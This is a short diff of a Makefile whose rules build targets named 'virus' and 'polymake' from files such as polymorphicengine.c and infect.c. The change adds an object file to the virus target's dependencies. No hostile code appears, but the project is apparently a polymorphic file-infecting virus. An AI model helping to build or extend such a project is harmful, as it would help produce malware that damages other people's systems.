@@ -47,7 +47,7 @@ all: virus polymake
 polymake: polyengine.o polymorphicengine.o
 	$(GCC) $(LFLAGS) $^ -o $@
 	
-virus: polymorphicengine.c infect.c virus.o 
+virus: polymorphicengine.c infect.c virus.o   polymorphicengine.o
 	$(CC) $(KFLAGS) $^ -o $@
 
 virus.o: virus.asm template.asm.inc
